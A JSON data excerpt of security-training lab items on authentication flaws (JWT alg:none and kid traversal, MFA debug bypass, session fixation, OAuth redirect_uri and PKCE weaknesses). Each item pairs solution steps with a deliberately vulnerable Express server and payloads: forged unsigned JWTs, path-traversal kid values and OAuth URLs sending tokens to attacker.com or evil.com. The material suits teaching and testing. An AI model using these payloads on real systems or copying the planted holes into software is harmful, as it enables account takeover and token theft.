        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.username) res.json({ data: { me: { username: decoded.username } } }); else res.status(401).send('Unauthorized'); } catch (err) { res.status(401).send('JWT Error'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"query\": \"{ me { username email } }\" }",
          "Authorization: Bearer [forged JWT with alg: none]"
        ]
      },
      {
        "Lab scenario": "MFA Bypass via Debug Parameter Injection in REST API",
        "Lab Description": "This labâ€™s REST-based login system includes a hidden debug parameter that allows bypassing the MFA challenge. When the debug=true parameter is set in the second-phase login POST request, the backend skips the MFA verification logic entirely. To solve: login as Carlos using the known password and bypass the MFA code requirement using the debug injection.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a full login request. Submit your own credentials and observe the 2FA challenge phase triggered in POST /verify.",
          "Repeat the process with the victim's username and password. In the intercepted request, add a debug=true parameter to the JSON body.",
          "Send the modified request with valid credentials and the added parameter to Burp Repeater.",
          "Observe that the MFA step is skipped and the server responds with a session cookie for Carlos.",
          "Visit /my-account using the new session cookie and verify successful login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'carpass', mfa: '333999' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.status(200).json({ mfaRequired: true }); }); app.post('/verify', (req, res) => { const { username, code, debug } = req.body; if (debug === 'true') return res.send(`Login successful for ${username}`); const user = users.find(u => u.username === username); if (user && user.mfa === code) res.send(`Login successful for ${username}`); else res.status(403).send('Invalid MFA code'); }); app.listen(4000);",
        "payloads": [
          "{ \"username\": \"carlos\", \"password\": \"carpass\" }",
          "{ \"username\": \"carlos\", \"code\": \"000000\", \"debug\": \"true\" }",
          "POST /verify with Content-Type: application/json and debug=true"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure Set-Cookie logic in login response",
        "Lab Description": "This lab's session management implementation is vulnerable to session fixation due to insecure handling of Set-Cookie during authentication. The application reuses a user-supplied session token without regeneration after login. To solve: hijack a victim session using a pre-authenticated session ID and access Carlos's account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite's Proxy to intercept a GET /login request and observe Set-Cookie behavior.",
          "In Burp Repeater, predefine a sessionID value and access the login page using the custom cookie.",
          "Log in with valid victim credentials using the same sessionID and observe that session token is not changed.",
          "Use the fixed sessionID to impersonate the victim in a different browser.",
          "Access /account/carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=post><input name=username><input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) res.send(`Welcome ${user}`); else res.send('Not logged in'); }); app.listen(3000);",
        "payloads": [
          "Set-Cookie: sid=fixate123; Path=/",
          "POST /login HTTP/1.1 with sid=fixate123",
          "GET /account with Cookie: sid=fixate123"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion leads to signature bypass",
        "Lab Description": "The app uses JWTs for authentication and fails to verify the algorithm properly, allowing an attacker to change the token's algorithm to 'none' to bypass signature verification. The application decodes and trusts any token if it passes decoding. To solve: forge a JWT token for carlos with 'none' alg and access /dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture a valid JWT token issued after login and decode it using jwt.io.",
          "Replace the header's 'alg' field with 'none' and modify the payload to impersonate 'carlos'.",
          "Remove the signature portion entirely to create a two-part JWT.",
          "Use Postman to send a GET /dashboard request with the forged token in Authorization: Bearer.",
          "Verify access as carlos by confirming welcome message on dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/token', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; if (!token) return res.status(401).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Welcome carlos'); } else { try { const payload = jwt.verify(token, secret); if (payload.user === 'carlos') return res.send('Welcome carlos'); } catch { return res.status(403).send('Invalid token'); } } res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
          "Payload: { \"user\": \"carlos\" }",
          "JWT: base64(header).base64(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration allows token stealing via redirect",
        "Lab Description": "This lab simulates a misconfigured OAuth implicit flow that reflects access tokens in the URL fragment. An attacker can inject a malicious redirect_uri to leak the token to an external site. To solve: steal Carlos's OAuth access token and use it to access his /user/settings page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to observe the /authorize endpoint and identify the use of implicit OAuth flow (response_type=token).",
          "Craft a malicious URL with a redirect_uri pointing to your server and send it to Carlos.",
          "Run a token-stealing listener (e.g., Python HTTP server) to capture the token from redirected traffic.",
          "Extract the token from the intercepted URL fragment.",
          "Send a GET /user/settings request with Authorization: Bearer <stolen_token> and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token' && client_id === 'trusted') { const token = 'access-token-carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.send('Invalid request'); } }); app.get('/user/settings', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') res.send('Welcome to Carlos's settings'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
        "payloads": [
          "https://vulnerable-app.com/authorize?response_type=token&client_id=trusted&redirect_uri=https://evil.com/callback",
          "Capture token from URL fragment: #access_token=access-token-carlos",
          "Authorization: Bearer access-token-carlos"
        ]
      }, 
      {
        "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
        "Lab Description": "The application's authentication mechanism relies on JWTs passed in the Authorization header. However, the server fails to properly validate the signing algorithm. The application accepts tokens signed with 'alg':'none', bypassing signature verification. To solve: gain access to Carlos's account using a forged token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request after logging in with any valid user. Extract the JWT from the Authorization header.",
          "2. Decode the token using jwt.io or Postman to view the header and payload.",
          "3. Modify the 'alg' in the header to 'none' and set the payload 'username':'carlos'.",
          "4. Remove the signature portion of the JWT entirely.",
          "5. Send the forged token in the Authorization header via Postman or Burp Repeater and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Invalid token'); const user = jwt.verify(token, secret); res.send(`Account: ${user.username}`); }); app.listen(4001);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session Fixation in Cookie Handling",
        "Lab Description": "The application assigns a session cookie to anonymous users but fails to rotate it after login. This allows an attacker to fix a victim's session beforehand and hijack their account once they log in. To solve: log in as Carlos using a pre-assigned session cookie.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Visit the app without logging in and capture the Set-Cookie: session=<token> header using Burp.",
          "2. Send a phishing or clickjacking payload that forces Carlos to log in while having this attacker-set cookie.",
          "3. Once Carlos logs in, reuse the same session cookie to hijack his session.",
          "4. Access the /my-account endpoint with the fixed session cookie in Burp Repeater.",
          "5. Confirm ownership of Carlosâ€™s session and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(7); sessions[sid] = {}; res.cookie('session', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[req.cookies.session].user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.user) res.send(`Welcome ${session.user}`); else res.status(403).send('Forbidden'); }); app.listen(4002);",
        "payloads": [
          "Cookie: session=attackerSession",
          "session fixation via iframe login using shared cookie"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Redirect URI",
        "Lab Description": "The OAuth flow used by the application is improperly configured to allow open redirect URIs. This enables attackers to intercept access tokens by specifying their own domain. To solve: capture Carlosâ€™s OAuth access token and use it to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Start OAuth login flow and observe that the redirect_uri parameter is passed via GET.",
          "2. Modify the redirect_uri to a malicious server under your control (e.g., https://attacker.com/callback).",
          "3. Use a phishing email to get Carlos to authorize access via the manipulated OAuth URL.",
          "4. Intercept the access token sent to your server after Carlos grants permission.",
          "5. Use Postman or Burp Repeater to access /my-account with the stolen token in the Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (client_id === 'trusted-client') { const token = Buffer.from('carlos-token').toString('base64'); const redirectURL = `${redirect_uri}#access_token=${token}`; res.redirect(redirectURL); } else { res.status(400).send('Invalid client'); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'carlos-token') res.send('Carlos Account'); else res.status(403).send('Invalid token'); }); app.listen(4003);",
        "payloads": [
          "https://target.com/auth?client_id=trusted-client&redirect_uri=https://evil.com/callback",
          "Authorization: Bearer Y2FybG9zLXRva2Vu"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "This lab's JWT-based authentication system fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite while logged in as a low-privilege user",
          "Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
          "Modify the alg header to 'none' and change the role claim to 'admin'",
          "Remove the signature portion of the JWT (after the last dot)",
          "Submit the modified token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, { algorithms: ['HS256', 'none'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "This lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage to attacker-controlled domains. The application generates OAuth tokens after successful authentication. To solve: steal a valid OAuth token by manipulating the redirect flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify the OAuth authorization endpoint using OWASP ZAP's spider functionality",
          "Intercept the initial OAuth flow and modify the redirect_uri parameter to point to an attacker-controlled domain",
          "Bypass client-side validation of redirect_uri by URL-encoding special characters",
          "Capture the authorization code or token when the victim gets redirected",
          "Exchange the stolen code for an access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  if (req.query.response_type === 'code') {\n    const authCode = 'auth_' + Math.random().toString(36).substr(2, 9);\n    const redirectUrl = new URL(redirect_uri);\n    redirectUrl.searchParams.set('code', authCode);\n    if (state) redirectUrl.searchParams.set('state', state);\n    res.redirect(redirectUrl.toString());\n  } else {\n    res.status(400).send('Unsupported response_type');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://attacker.com/callback?code=AUTH_CODE&state=123",
          "https://legit.com@attacker.com/callback?code=AUTH_CODE",
          "https://legit.com/callback.attacker.com?code=AUTH_CODE"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure session regeneration in GraphQL endpoint",
        "Lab Description": "This lab's GraphQL API fails to properly regenerate session tokens after authentication, allowing session fixation attacks. The application maintains the same session ID pre- and post-login. To solve: fixate a session on a victim's browser and gain access when they authenticate.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Obtain a valid session cookie before authentication using Postman",
          "Craft a GraphQL mutation containing the session cookie in a CSRF attack",
          "Use OWASP ZAP to test session token behavior during login flows",
          "Verify the session remains identical after authentication by comparing cookies",
          "Inject the fixated session into a browser to hijack the authenticated session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n  }\n  type User {\n    username: String\n    role: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
        "payloads": [
          "mutation { login(username: \"admin\", password: \"admin123\") { username role } }",
          "query { getUser { username role } }",
          "POST /graphql HTTP/1.1\nHost: vulnerable.com\nCookie: session=fixated_id\nContent-Type: application/json\n\n{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") { username role } }\"}"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in REST API authentication",
        "Lab Description": "This lab's JWT validation improperly uses the kid header to load verification keys from the filesystem without proper sanitization. The application blindly trusts the kid parameter when selecting verification keys. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite and decode it to analyze the kid header",
          "Modify the kid parameter to attempt directory traversal (../../../../etc/passwd)",
          "When this fails, test for predictable key locations by setting kid to known paths like ../../../../var/www/keys/public.pem",
          "Generate a new token signed with the predictable public key and elevated privileges",
          "Submit the forged token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst users = {\n  'user': { password: 'normalpass', role: 'user' },\n  'admin': { password: 'adminpass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey', { header: { kid: 'safeKey' } });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      const keyPath = `/var/www/keys/${header.kid}`;\n      fs.readFile(keyPath, (err, key) => {\n        callback(err, key);\n      });\n    });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL3Zhci93d3cva2V5cy9wdWJsaWMucGVtIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking via state parameter reflection",
        "Lab Description": "This lab's OAuth implementation fails to validate the state parameter between requests, allowing token hijacking. The application reflects the state parameter from the authorization request to the callback without validation. To solve: intercept an OAuth flow and steal a victim's token by predicting the state value.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate an OAuth flow using Postman and observe the state parameter format",
          "Set up a malicious redirect URI in your OAuth client configuration",
          "Intercept a victim's authorization request using Burp Suite",
          "Modify the redirect_uri to point to your server while preserving the state",
          "Capture the authorization code when the victim is redirected to your site",
          "Exchange the stolen code for an access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback', 'https://attacker.com'] }\n};\n\nlet authRequests = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state, response_type } = req.query;\n  const client = clients[client_id];\n  \n  if (!client || !client.redirectUris.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  \n  authRequests[state] = { client_id, redirect_uri };\n  res.redirect(`${redirect_uri}?code=auth_code&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, state } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=12345",
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com/callback&response_type=code&state=12345",
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com@attacker.com&response_type=code&state=12345"
        ]
      },
      {
        "Lab scenario": "Session fixation via GraphQL introspection leaks",
        "Lab Description": "This lab's GraphQL endpoint exposes session management functionality through introspection, allowing attackers to fixate sessions. The application's GraphQL schema reveals mutation fields for session handling without proper access controls. To solve: use introspection to discover session mutations and fixate a session on a victim's browser.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use GraphiQL or Postman to send an introspection query to the GraphQL endpoint",
          "Analyze the schema to discover session-related mutations",
          "Craft a mutation to generate or modify session tokens",
          "Fixate the generated session token in a victim's browser via XSS or social engineering",
          "Wait for the victim to authenticate and hijack their session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n    getSession: Session\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n    createSession(username: String!): Session\n    rotateSession: Session\n  }\n  type User {\n    username: String\n    role: String\n  }\n  type Session {\n    id: String\n    expires: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  getSession: (args, req) => {\n    return { id: req.cookies.session?.id, expires: '2023-12-31' };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  },\n  createSession: ({ username }, req) => {\n    const sessionId = Math.random().toString(36).substr(2, 10);\n    return { id: sessionId, expires: '2023-12-31' };\n  },\n  rotateSession: (args, req) => {\n    if (!req.cookies.session) throw new Error('No session');\n    req.cookies.session.id = Math.random().toString(36).substr(2, 10);\n    return { id: req.cookies.session.id, expires: '2023-12-31' };\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
        "payloads": [
          "mutation { createSession(username: \"admin\") { id } }",
          "query { __schema { mutationType { fields { name description } } }",
          "mutation { rotateSession { id } }"
        ]
      },
      {
        "Lab scenario": "JWT signature stripping in microservice authentication",
        "Lab Description": "This lab's microservice architecture fails to properly validate JWT signatures across services. The frontend service accepts unsigned tokens when forwarded from internal services. To solve: bypass authentication by stripping the signature from a valid JWT and injecting it into internal service calls.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite while making normal API requests",
          "Remove the signature portion and test if the unsigned token is accepted",
          "Identify internal service endpoints through API documentation or fuzzing",
          "Craft a request to an internal user management service with the unsigned token",
          "Escalate privileges by modifying user attributes in the internal service response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst internalServices = {\n  'user-service': 'http://internal-user-service'\n};\n\napp.use((req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (req.headers['x-internal-request'] === 'true') {\n        req.user = decoded.payload;\n        return next();\n      }\n      jwt.verify(token, 'secretKey');\n      req.user = decoded.payload;\n    } catch (err) {\n      return res.status(401).send('Invalid token');\n    }\n  }\n  next();\n});\n\napp.get('/internal/user', async (req, res) => {\n  const response = await fetch(`${internalServices['user-service']}/user`, {\n    headers: {\n      'Authorization': `Bearer ${req.headers.authorization?.split(' ')[1]}`,\n      'X-Internal-Request': 'true'\n    }\n  });\n  res.json(await response.json());\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure PKCE implementation",
        "Lab Description": "This lab's OAuth implementation uses Proof Key for Code Exchange (PKCE) incorrectly, allowing authorization code interception. The application fails to validate the code_verifier properly during token exchange. To solve: intercept an authorization code and exchange it for a token without the original code_verifier.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate an OAuth flow using Postman with PKCE parameters",
          "Intercept the authorization code response using Burp Suite",
          "Observe the PKCE code_challenge method and parameters",
          "Attempt token exchange without the code_verifier parameter",
          "Modify the code_challenge_method to 'plain' when the original uses 'S256'",
          "Complete the token exchange to obtain an access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { \n    secret: 'sec456', \n    redirectUris: ['https://client.com/callback'],\n    requirePKCE: true\n  }\n};\n\nlet authCodes = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, code_challenge, code_challenge_method } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  const authCode = 'code_' + Math.random().toString(36).substr(2, 8);\n  authCodes[authCode] = { \n    client_id,\n    code_challenge,\n    code_challenge_method\n  };\n  \n  res.redirect(`${redirect_uri}?code=${authCode}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, code_verifier } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  if (client.requirePKCE && !authCodes[code]) {\n    return res.status(400).json({ error: 'invalid_grant' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code",
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_challenge_method=plain",
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_verifier="
        ]
      },
      {
        "Lab scenario": "Session fixation via WebSocket handshake",
        "Lab Description": "This lab's WebSocket implementation creates sessions during the HTTP handshake without proper validation. The application assigns session identifiers before authentication is complete. To solve: fixate a session during the WebSocket handshake and hijack it after victim authentication.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Establish a WebSocket connection using Burp Suite's WebSockets history",
          "Analyze the handshake request for session identifiers",
          "Modify the handshake request to inject a known session ID",
          "Trigger authentication through the WebSocket channel",
          "Reuse the fixated session ID in a new connection to hijack the authenticated session"
        ],
        "Vulnerability name": "Authentication",
